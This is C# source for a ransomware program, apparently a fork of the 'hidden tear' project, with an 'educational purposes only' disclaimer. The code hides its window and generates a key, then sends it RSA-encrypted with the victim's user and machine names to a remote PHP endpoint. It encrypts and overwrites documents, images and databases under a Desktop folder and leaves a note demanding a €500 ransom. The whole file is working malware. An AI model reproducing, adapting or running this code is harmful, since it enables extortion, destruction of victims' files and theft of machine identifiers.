/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
 
 * Forked from the code by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using Javascience;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "http://192.168.0.103:8888/evilvault.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string UUID = Guid.NewGuid().ToString(); 
        string userDir = "C:\\Users\\";
        
        List<string> list_with_encrypted_files = new List<string>();
        




        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 5, 8, 10, 78, 90, 56, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            
            //avoiding the same seed with random guid generation
            Random rnd = new Random(Guid.NewGuid().GetHashCode());
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }
        
 
        
       public static string EncryptPassword(string password)
        {
            string ServerPubKeyOutput = "-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDbv/DGt9yCE8F93pcZatx/Uuef7m/ztRSrrS2p99Fl554/7XzGmktS3ArxyZOaz0rdhkdaZxzvZ6g8Ip0uBzTDcI5heVz3Ek0aCxIAiFZh/ScrtjIXg+JERty9cYZ6aBhMWn9tXEWWMOzYlumT6MpAdE8fzr1DTQqKpoSL0aDrAwIDAQAB-----END PUBLIC KEY-----";
           
            string ServerPubKey = Javascience.opensslkey.DecodePEMKey(ServerPubKeyOutput);

            RSACryptoServiceProvider ServerRSA = new RSACryptoServiceProvider();
            ServerRSA.FromXmlString(ServerPubKey);
            string SecretPassword = Uri.EscapeDataString(Convert.ToBase64String(RSAEncrypt(Encoding.UTF8.GetBytes(password), ServerRSA.ExportParameters(false))));
            
            return SecretPassword;

        }
        
        static public byte[] RSAEncrypt(byte[] DataToEncrypt, RSAParameters RSAKeyInfo)
        {
            byte[] encryptedData;

            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
            RSA.ImportParameters(RSAKeyInfo);

            encryptedData = RSA.Encrypt(DataToEncrypt, true);

            return encryptedData;
        }

        //Sends created password target location
        public void SendPassword(string password){
            
            string Encryptedpassword = EncryptPassword(password);
            string info = UUID + "|" + computerName + "|" + userName + "|" + Encryptedpassword;
            var fullUrl = targetURL + info;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {
             
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            
            int filesize = bytesToBeEncrypted.Length;
            
            //Create bytearray with zeros
            byte[] zeroes = new byte[filesize];
            
            //Create bytearray with random numbers
            Random rnd = new Random();
            byte[] randoms = new Byte[filesize];
            rnd.NextBytes(randoms);
            
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            
            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
            
            //first phase: overwrite with zeroes
            File.WriteAllBytes(file, zeroes);
            //second phase: overwrite with randoms
            File.WriteAllBytes(file, randoms);
            //third phase: overwrite with zeroes
            File.WriteAllBytes(file, zeroes);
            //fourth phase: overwrite file with encrypted data
            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".Qwfsdfjio");
            
            list_with_encrypted_files.Add(file);

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            
   
            
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",".mp3"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],password);
            }
            
            
        }

        public void startAction()
        {   
            string startsentence = "The following files are encrypted: \n\n";
            list_with_encrypted_files.Add(startsentence);
            string password = CreatePassword(15);
            string path = "\\Desktop\\infectionzone";
            string startPath = userDir + userName + path;
            SendPassword(password);
            encryptDirectory(startPath,password);
            messageCreator();
            password = null;
            Form2 countdown = new Form2();
            countdown.Show();
       

        }

        public void messageCreator()
        {
            //write message to user
            string path = "\\Desktop\\VERY_IMPORTANT_READ_IT_.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "Your documents, pictures, databases and other important files are encrypted with a strong encryption and unique key.\n",  "The private decryption key is saved on a secret server and nobody can decrypt your files  until you pay and obtain the private key\n\n", " Follow the following instructions if you want to decrypt your files: \n\n", "\n1. GO TO THIS WEBSITE: http://192.168.0.103:8888/payment.html \n\n", "\n2. Pay a ransome of €500 with your creditcard on this page \n\n", "\n3. GO TO THIS WEBSITE: http://192.168.0.103:8888/unlock.html \n\n", "4. Copy past the following UUID in the form on the website",UUID,"\n\n", "5. Follow on the website the next instructions"};
            System.IO.File.WriteAllLines(fullpath, lines);
            
            //write list wit encrypted files
            string path_with_list = "\\Desktop\\LIST_WITH_ENCRYPTED_FILES.txt";
            string fullpath_for_list = userDir + userName + path_with_list;
            string[] listlines = list_with_encrypted_files.ToArray();
            System.IO.File.WriteAllLines(fullpath_for_list, listlines);
            
            
            
        }
    }
}
